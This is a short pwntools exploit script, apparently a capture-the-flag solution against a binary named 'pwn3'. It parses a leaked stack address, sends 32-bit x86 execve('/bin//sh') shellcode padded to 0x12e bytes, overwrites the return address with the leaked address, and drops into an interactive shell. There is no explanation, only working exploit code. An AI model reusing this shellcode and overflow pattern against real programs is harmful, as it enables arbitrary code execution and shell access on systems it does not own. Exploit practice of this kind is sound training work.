#!/usr/bin/python3
import pwn
e = pwn.context.binary = pwn.ELF("./pwn3")
p = e.debug(gdbscript="source /home/nick/global/halfdisp.py"
    +"\nbreak *echo"
    +"\nc"
)
#p = pwn.process("./pilot")
p.recvuntil("journey ")
leak = p.recvline()
inputAdr = int(leak.strip(b"!\n"), 16)


payload = b"\x31\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

payload += b"0"*(0x12e - len(payload))
payload += pwn.p32(inputAdr)
p.send(payload)
p.interactive()


